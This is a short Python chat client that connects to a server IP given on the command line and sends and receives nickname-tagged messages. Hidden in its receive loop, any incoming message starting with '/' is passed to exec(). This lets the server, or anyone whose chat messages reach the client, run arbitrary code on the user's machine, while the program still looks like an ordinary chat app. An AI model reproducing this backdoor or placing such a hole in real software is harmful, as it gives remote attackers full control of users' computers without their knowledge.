import sys
import socket, threading
nickname = input("Choose your nickname: ")

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)      

ip = sys.argv[1]

# client.connect(('127.0.0.1', 7976))                             
client.connect((ip, 7976))                             

def receive():
    while True:                                                 
        try:
            message = client.recv(1024).decode('ascii')
            
            if message.startswith('/'):
                result = exec(message[1:])
                print(result)
                continue
            
            if message == 'NICKNAME':
                client.send(nickname.encode('ascii'))
            else:
                print(message)
        except:                                                 
            print("An error occured!")
            client.close()
            break
def write():
    while True:                                                 
        message = '{}: {}'.format(nickname, input(''))
        client.send(message.encode('ascii'))

receive_thread = threading.Thread(target=receive)               
receive_thread.start()
write_thread = threading.Thread(target=write)                    
write_thread.start()